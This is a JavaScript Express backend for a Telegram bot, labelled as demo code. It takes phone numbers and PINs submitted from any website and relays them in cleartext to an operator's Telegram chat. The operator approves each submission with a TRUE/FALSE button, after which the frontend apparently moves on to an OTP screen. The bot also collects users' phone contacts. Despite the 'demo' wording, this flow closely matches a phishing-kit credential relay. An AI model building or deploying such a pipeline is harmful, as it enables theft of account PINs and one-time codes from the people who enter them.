require("dotenv").config();

const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const BACKEND_URL = process.env.BACKEND_URL;

if (!BOT_TOKEN) {
    console.error("❌ TELEGRAM_BOT_TOKEN is missing.");
    process.exit(1);
}

if (!ADMIN_CHAT_ID) {
    console.warn("⚠️ TELEGRAM_ADMIN_CHAT_ID is missing.");
}

const TELEGRAM_API =
    `https://api.telegram.org/bot${BOT_TOKEN}`;

// Temporary demo requests.
// These are intentionally in memory only.
const demoRequests = new Map();

// ==========================================
// TELEGRAM API
// ==========================================

async function telegram(method, data = {}) {
    try {
        const response = await fetch(
            `${TELEGRAM_API}/${method}`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }
        );

        const result = await response.json();

        if (!result.ok) {
            console.error("Telegram error:", result);
        }

        return result;

    } catch (error) {
        console.error(
            "Telegram request failed:",
            error
        );

        return null;
    }
}

// ==========================================
// SEND MESSAGE
// ==========================================

async function sendMessage(chatId, text, options = {}) {
    if (!chatId) {
        return null;
    }

    return telegram(
        "sendMessage",
        {
            chat_id: chatId,
            text,
            parse_mode: "HTML",
            ...options
        }
    );
}

// ==========================================
// ADMIN MESSAGE
// ==========================================

async function notifyAdmin(text, options = {}) {
    if (!ADMIN_CHAT_ID) {
        return null;
    }

    return sendMessage(
        ADMIN_CHAT_ID,
        text,
        options
    );
}

// ==========================================
// DEMO VERIFICATION
// ==========================================

app.post(
    "/demo-verification",
    async (req, res) => {

        try {

            const {
                phone,
                demoPin
            } = req.body;

            if (!phone || !demoPin) {
                return res.status(400).json({
                    success: false,
                    message:
                        "Phone and demo PIN are required."
                });
            }

            // Generate a temporary demo request ID.
            const requestId =
                `DEMO-${Date.now()}-${Math.random()
                    .toString(36)
                    .substring(2, 8)}`;

            demoRequests.set(
                requestId,
                {
                    status: "pending",
                    createdAt: Date.now()
                }
            );

            const message =
                `🔔 <b>TEST VERIFICATION REQUEST</b>\n\n` +
                `Phone: <code>${phone}</code>\n` +
                `Test PIN: <code>${demoPin}</code>\n\n` +
                `Request: <code>${requestId}</code>\n\n` +
                `<b>Confirm test request:</b>`;

            const result =
                await notifyAdmin(
                    message,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: "✅ TRUE",
                                        callback_data:
                                            `test_true:${requestId}`
                                    },
                                    {
                                        text: "❌ FALSE",
                                        callback_data:
                                            `test_false:${requestId}`
                                    }
                                ]
                            ]
                        }
                    }
                );

            if (!result?.ok) {

                demoRequests.delete(requestId);

                return res.status(500).json({
                    success: false,
                    message:
                        "Unable to send test request to Telegram."
                });
            }

            return res.json({
                success: true,
                requestId,
                status: "pending",
                message:
                    "Test verification request sent."
            });

        } catch (error) {

            console.error(
                "Demo verification error:",
                error
            );

            return res.status(500).json({
                success: false,
                message:
                    "Server error."
            });
        }
    }
);

// ==========================================
// CHECK DEMO STATUS
// ==========================================

app.get(
    "/demo-verification/status/:requestId",
    (req, res) => {

        const requestId =
            req.params.requestId;

        const request =
            demoRequests.get(requestId);

        if (!request) {
            return res.status(404).json({
                success: false,
                message:
                    "Demo request not found."
            });
        }

        return res.json({
            success: true,
            requestId,
            status: request.status
        });
    }
);

// ==========================================
// HANDLE TEST DECISION
// ==========================================

async function handleTestDecision(
    callback,
    approved,
    requestId
) {

    const request =
        demoRequests.get(requestId);

    if (request) {

        request.status =
            approved
                ? "approved"
                : "rejected";

        demoRequests.set(
            requestId,
            request
        );
    }

    await telegram(
        "answerCallbackQuery",
        {
            callback_query_id: callback.id,
            text: approved
                ? "TRUE selected"
                : "FALSE selected"
        }
    );

    const chatId =
        callback.message?.chat?.id;

    if (!chatId) {
        return;
    }

    if (approved) {

        await sendMessage(
            chatId,

            `✅ <b>TEST VERIFICATION APPROVED</b>\n\n` +
            `The synthetic request was marked TRUE.\n\n` +
            `The demo frontend can now continue to the Demo OTP screen.`
        );

    } else {

        await sendMessage(
            chatId,

            `❌ <b>TEST VERIFICATION REJECTED</b>\n\n` +
            `The synthetic request was marked FALSE.`
        );
    }
}

// ==========================================
// TELEGRAM WEBHOOK
// ==========================================

app.post(
    "/telegram/webhook",
    async (req, res) => {

        try {

            const update =
                req.body;

            // ------------------------------
            // MESSAGES
            // ------------------------------

            if (update.message) {

                const message =
                    update.message;

                if (
                    message.text === "/start"
                ) {

                    const chatId =
                        message.chat.id;

                    await sendMessage(
                        chatId,

                        `👋 <b>Welcome</b>\n\n` +
                        `Your Telegram account has been connected successfully.\n\n` +
                        `This bot is configured for demo testing.`,

                        {
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        {
                                            text:
                                                "📱 Share Phone Number",
                                            callback_data:
                                                "share_phone"
                                        }
                                    ]
                                ]
                            }
                        }
                    );
                }

                else if (
                    message.contact
                ) {

                    const chatId =
                        message.chat.id;

                    const phone =
                        message.contact.phone_number;

                    await sendMessage(
                        chatId,

                        `✅ <b>Phone Number Received</b>\n\n` +
                        `Phone: ${phone}`
                    );
                }
            }

            // ------------------------------
            // CALLBACKS
            // ------------------------------

            if (update.callback_query) {

                const callback =
                    update.callback_query;

                const data =
                    callback.data || "";

                if (
                    data.startsWith(
                        "test_true:"
                    )
                ) {

                    const requestId =
                        data.substring(
                            "test_true:".length
                        );

                    await handleTestDecision(
                        callback,
                        true,
                        requestId
                    );

                }

                else if (
                    data.startsWith(
                        "test_false:"
                    )
                ) {

                    const requestId =
                        data.substring(
                            "test_false:".length
                        );

                    await handleTestDecision(
                        callback,
                        false,
                        requestId
                    );
                }

                else if (
                    data === "share_phone"
                ) {

                    await telegram(
                        "answerCallbackQuery",
                        {
                            callback_query_id:
                                callback.id
                        }
                    );

                    await sendMessage(
                        callback.message.chat.id,

                        `📱 <b>Share Phone Number</b>\n\n` +
                        `This is a demo-only phone sharing step.`,

                        {
                            reply_markup: {
                                keyboard: [
                                    [
                                        {
                                            text:
                                                "📱 Share My Phone Number",
                                            request_contact:
                                                true
                                        }
                                    ]
                                ],
                                resize_keyboard:
                                    true,
                                one_time_keyboard:
                                    true
                            }
                        }
                    );
                }
            }

            res.sendStatus(200);

        } catch (error) {

            console.error(
                "Webhook error:",
                error
            );

            res.sendStatus(500);
        }
    }
);

// ==========================================
// HEALTH CHECK
// ==========================================

app.get("/", (req, res) => {

    res.json({
        success: true,
        message:
            "Telegram Bot Backend is running",
        status: "online"
    });
});

// ==========================================
// SET WEBHOOK
// ==========================================

app.get(
    "/set-webhook",
    async (req, res) => {

        if (!BACKEND_URL) {

            return res.status(400).json({
                success: false,
                message:
                    "BACKEND_URL is missing."
            });
        }

        const webhookUrl =
            `${BACKEND_URL.replace(/\/$/, "")}` +
            `/telegram/webhook`;

        const result =
            await telegram(
                "setWebhook",
                {
                    url: webhookUrl
                }
            );

        res.json({
            success:
                result?.ok === true,

            webhook:
                webhookUrl,

            telegram:
                result
        });
    }
);

// ==========================================
// WEBHOOK INFO
// ==========================================

app.get(
    "/webhook-info",
    async (req, res) => {

        const result =
            await telegram(
                "getWebhookInfo"
            );

        res.json(result);
    }
);

// ==========================================
// BOT INFO
// ==========================================

app.get(
    "/bot-info",
    async (req, res) => {

        const result =
            await telegram(
                "getMe"
            );

        res.json(result);
    }
);

// ==========================================
// CLEAN OLD DEMO REQUESTS
// ==========================================

setInterval(
    () => {

        const now =
            Date.now();

        for (
            const [id, request]
            of demoRequests.entries()
        ) {

            if (
                now - request.createdAt >
                15 * 60 * 1000
            ) {

                demoRequests.delete(id);
            }
        }

    },
    5 * 60 * 1000
);

// ==========================================
// SERVER
// ==========================================

app.listen(
    PORT,
    () => {

        console.log(
            `🚀 Telegram Bot Backend running on port ${PORT}`
        );

    }
);
